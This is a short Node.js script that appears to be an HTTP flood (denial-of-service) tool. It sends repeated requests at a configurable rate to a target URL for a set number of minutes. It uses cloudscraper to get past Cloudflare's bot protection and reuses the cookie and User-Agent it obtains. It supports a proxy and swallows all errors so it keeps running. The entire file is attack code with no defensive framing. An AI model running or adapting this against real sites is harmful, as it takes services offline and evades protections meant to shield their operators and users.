import cloudscraper from 'cloudscraper'
import request from 'request'
import 'dotenv/config'

const url = process.env.TARGET_URL
const proxy = process.env.PROXY_ADDRESS
const speed = Math.round(1000 / process.env.ATTACKS_PER_SECOND) || 0
const lifeTime = process.env.LIFE_TIME_MINUTES || 60

if (url) {
  success(url, speed, lifeTime)
} else {
  throw new Error('URL was not found. Add value into .env file')
}

if (proxy) {
  cloudscraper = cloudscraper.defaults({ proxy })
}

import { generateOptions, printStatus, success } from './src/utils.js'

const handler = setInterval(() => {
  let cookie = ''
  let useragent = ''

  cloudscraper.get(url, (error, response) => {
    if (response) {
      const result = JSON.parse(JSON.stringify(response))
      useragent = result.request.headers['User-Agent']
      cookie = result.request.headers.Cookie

      printStatus(result.statusCode)
    } else {
      console.error('\x1b[31m%s\x1b[0m', 'the server is down', error.message)
    }

    const options = generateOptions(url, useragent, cookie)

    request(options)
  })
}, speed)

setTimeout(() => clearInterval(handler), lifeTime * 60000)

process.on('uncaughtException', () => {})
process.on('unhandledRejection', () => {})
